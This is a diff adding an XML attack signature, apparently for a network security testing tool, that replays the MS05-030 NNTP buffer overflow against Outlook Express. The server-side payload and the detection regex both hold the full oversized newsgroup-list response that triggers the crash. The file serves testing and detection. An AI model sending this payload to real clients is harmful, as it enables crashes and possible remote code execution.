@@ -1,0 +1,110 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="MS05-030 NNTP Crash On Outlook Express (IPv6 Version)"/>
+    <EngDesc display="true" value="This threat causes a crash and can be used to cause remote code execution Outlook Express through a malicious NNTP server.  NNTP is the protocol used for Usenet, and typically runs on port 119.  This threat is a client attack that comes from the virtual server. (IPv6 Version)"/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="NNTP/IPv6"/>
+    <Type_Of_Equipment display="true">
+      <item value="MUA"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="Microsoft_Outlook_Express"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Microsoft_Outlook_Express_6.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.idefense.com/application/poi/display?id=263&amp;type=vulnerabilities"/>
+    <CVEID display="true" value="CVE-2005-1213"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="17306"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="3f4d55d63ff103b042620ea6f4e30dce"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="1211991642"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="P"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X32\X31\X35\X20\X6C\X69\X73\X74\X20\X6F\X66\X20\X6E\X65\X77\X73\X67\X72\X6F\X75\X70\X73\X20\X66\X6F\X6C\X6C\X6F\X77\X73\X0A\X61\X6C\X74\X2E\X31\X32\X68\X72\X20\X30\X61\X6C\X73\X6B\X6A\X64\X6E\X66\X6C\X6B\X6A\X61\X73\X64\X6E\X66\X6C\X6B\X61\X6A\X73\X64\X6E\X66\X6C\X6B\X61\X73\X64\X6A\X66\X6E\X6C\X6B\X61\X73\X64\X6A\X66\X6E\X6C\X61\X6B\X73\X64\X6A\X66\X6E\X61\X6C\X6B\X73\X64\X6A\X66\X6E\X6C\X61\X6B\X73\X64\X6A\X66\X6E\X61\X6C\X73\X6B\X64\X6A\X66\X6E\X61\X6C\X73\X6B\X64\X6A\X66\X6E\X61\X6C\X73\X6B\X64\X6A\X66\X6E\X61\X73\X6C\X6B\X64\X6A\X66\X6E\X61\X73\X6C\X6B\X64\X6A\X66\X6E\X61\X73\X6C\X6B\X64\X6A\X66\X6E\X61\X73\X64\X6B\X6C\X6A\X66\X6E\X61\X73\X6C\X6B\X64\X6A\X66\X6E\X61\X73\X6C\X6B\X64\X6A\X66\X6E\X61\X73\X6C\X6B\X64\X6A\X66\X6E\X61\X73\X6C\X6B\X64\X6A\X66\X6E\X61\X73\X6C\X6B\X64\X6A\X66\X6E\X61\X6C\X73\X6B\X64\X6A\X66\X62\X6E\X61\X6C\X6B\X73\X64\X6A\X66\X6E\X61\X6C\X6B\X73\X64\X6A\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X64\X6A\X66\X6E\X61\X6C\X73\X6B\X64\X6A\X66\X6E\X61\X6C\X6B\X73\X64\X6A\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X73\X6B\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X6C\X6B\X61\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X64\X6A\X66\X6E\X6C\X6B\X61\X73\X64\X66\X6E\X61\X6C\X73\X6B\X64\X6A\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X64\X6A\X66\X6E\X61\X6C\X73\X6B\X6A\X64\X66\X6E\X6C\X6B\X61\X73\X6A\X64\X6E\X66\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X6E\X66\X6C\X6B\X61\X73\X64\X6A\X66\X6E\X61\X6C\X73\X6B\X64\X6A\X66\X6E\X61\X6C\X73\X6B\X64\X6A\X66\X6E\X6C\X6B\X61\X73\X6A\X64\X66\X6E\X6C\X61\X73\X6B\X64\X6A\X66\X6E\X61\X6C\X73\X6B\X64\X6A\X66\X6E\X6C\X61\X6B\X73\X64\X6A\X6E\X66\X6C\X6B\X61\X6A\X73\X64\X6E\X66\X6B\X6C\X73\X64\X61\X6A\X66\X6E\X61\X6B\X6C\X73\X64\X6A\X66\X6E\X6C\X61\X6B\X73\X64\X6A\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X6E\X66\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X73\X6B\X6A\X64\X66\X6E\X6C\X6B\X61\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X64\X6A\X6E\X66\X6C\X61\X73\X6B\X6A\X64\X6E\X66\X6C\X61\X6B\X73\X6A\X64\X6E\X66\X61\X6C\X73\X6B\X6A\X64\X66\X6E\X6C\X61\X73\X6B\X64\X6A\X66\X6E\X6C\X61\X73\X6B\X6A\X64\X66\X6E\X61\X6C\X73\X6B\X64\X6A\X66\X6E\X6C\X61\X73\X6B\X6A\X64\X6E\X66\X6C\X61\X6B\X73\X6A\X64\X6E\X66\X6C\X6B\X61\X73\X6A\X64\X6E\X66\X6C\X6B\X61\X73\X64\X6A\X6E\X66\X6C\X6B\X61\X73\X64\X6A\X6E\X66\X6C\X6B\X61\X6A\X73\X64\X6E\X66\X6C\X6B\X61\X73\X6A\X64\X6E\X66\X6C\X6B\X61\X73\X6A\X64\X6E\X66\X6C\X6B\X6A\X61\X73\X64\X6E\X66\X6C\X6B\X61\X73\X6A\X64\X6E\X66\X6C\X6B\X61\X6A\X73\X64\X6E\X66\X6C\X6B\X61\X6A\X73\X64\X6E\X66\X6C\X6B\X61\X73\X6A\X64\X6E\X66\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X6A\X73\X64\X6E\X66\X6C\X61\X6B\X73\X6A\X64\X6E\X66\X6C\X6B\X61\X6A\X73\X64\X6E\X66\X6C\X61\X6B\X6A\X73\X64\X6E\X66\X6C\X61\X6B\X6A\X73\X64\X6E\X66\X6C\X61\X6B\X73\X6A\X64\X6E\X66\X6C\X6B\X61\X73\X6A\X64\X6E\X66\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X64\X6A\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X64\X6A\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X73\X6B\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X64\X6A\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X6A\X73\X64\X66\X6E\X6C\X6B\X61\X6A\X73\X64\X66\X6E\X6C\X6B\X61\X73\X6A\X64\X66\X6E\X61\X6C\X6B\X6A\X64\X66\X6E\X6C\X6B\X61\X73\X6A\X64\X66\X6E\X6C\X61\X6B\X73\X64\X6A\X6E\X30\X30\X30\X30\X30\X31\X33\X32\X35\X20\X30\X30\X30\X30\X30\X30\X31\X33\X32\X32\X20\X79\X0A"/>
+    <Created value="1139462281" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="F"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv6Address" value="null" index="G"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="H"/>
+    <NamedVar name="NNTPdestPort" type="ImperfectControls.Port" value="null" index="I"/>
+  </Variables>
+  <Loops>
+    <for index="B">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+    <for index="C"/>
+    <for index="P"/>
+    <for index="D">
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+    </for>
+  </Loops>
+  <Output index="B" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026, 65535)" destPort="$NNTPdestPort" SeqNumber="8A2AB861" AckNumber="393258D4" HeaderLength="05" WindowSize="FAD9" Checksum="C677" UrgentPointer="0000" Options="" Payload="4D4F4445205245414445520D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$sourceIP" Destination-Address="$destIP">
+        <TCP srcPort="@random(1026, 65535)" destPort="$NNTPdestPort" SeqNumber="8A2AB86E" AckNumber="393258E2" HeaderLength="05" WindowSize="FACB" Checksum="8A31" UrgentPointer="0000" Options="" Payload="4C495354200D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,2">
+    <Output index="C" Count="">
+      <Ethernet srcMac="00:50:56:C0:00:08" destMac="00:0C:29:6E:DF:7E" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="192.168.254.1" Destination-Address="192.168.254.128">
+          <TCP srcPort="119" destPort="1046" SeqNumber="393258D4" AckNumber="8A2AB86E" HeaderLength="05" WindowSize="16D0" Checksum="D7DF" UrgentPointer="0000" Options="" Payload="313030206B656570676F696E670A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="P" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="" Destination-Address="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="323135206C697374206F66206E65777367726F75707320666F6C6C6F77730A616C742E313268722030616C736B6A646E666C6B6A6173646E666C6B616A73646E666C6B6173646A666E6C6B6173646A666E6C616B73646A666E616C6B73646A666E6C616B73646A666E616C736B646A666E616C736B646A666E616C736B646A666E61736C6B646A666E61736C6B646A666E61736C6B646A666E6173646B6C6A666E61736C6B646A666E61736C6B646A666E61736C6B646A666E61736C6B646A666E61736C6B646A666E616C736B646A66626E616C6B73646A666E616C6B73646A666E616C6B736A64666E616C6B73646A666E616C736B646A666E616C6B73646A666E616C6B736A64666E6C616B736A64666E6C616B736A64666E616C736B6A64666E6C616B736A64666E6C6B61736A64666E6C616B736A64666E6C616B736A64666E6C616B73646A666E6C6B617364666E616C736B646A666E616C6B736A64666E6C616B736A64666E6C616B736A64666E6C616B736A64666E6C616B73646A666E616C736B6A64666E6C6B61736A646E666C616B736A64666E6C616B736A646E666C6B6173646A666E616C736B646A666E616C736B646A666E6C6B61736A64666E6C61736B646A666E616C736B646A666E6C616B73646A6E666C6B616A73646E666B6C7364616A666E616B6C73646A666E6C616B73646A666E6C616B736A646E666C616B736A64666E616C6B736A64666E616C736B6A64666E6C6B61736A64666E6C616B73646A6E666C61736B6A646E666C616B736A646E66616C736B6A64666E6C61736B646A666E6C61736B6A64666E616C736B646A666E6C61736B6A646E666C616B736A646E666C6B61736A646E666C6B6173646A6E666C6B6173646A6E666C6B616A73646E666C6B61736A646E666C6B61736A646E666C6B6A6173646E666C6B61736A646E666C6B616A73646E666C6B616A73646E666C6B61736A646E666C616B736A64666E616C6B736A64666E616C6B736A64666E616C6B736A64666E6C616B6A73646E666C616B736A646E666C6B616A73646E666C616B6A73646E666C616B6A73646E666C616B736A646E666C6B61736A646E666C616B736A64666E6C616B736A64666E6C616B73646A666E616C6B736A64666E6C616B736A64666E616C6B736A64666E616C6B73646A666E616C6B736A64666E616C736B6A64666E616C6B736A64666E616C6B736A64666E616C6B736A64666E616C6B73646A666E616C6B736A64666E616C6B736A64666E6C616B6A7364666E6C6B616A7364666E6C6B61736A64666E616C6B6A64666E6C6B61736A64666E6C616B73646A6E303030303031333235203030303030303133323220790A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
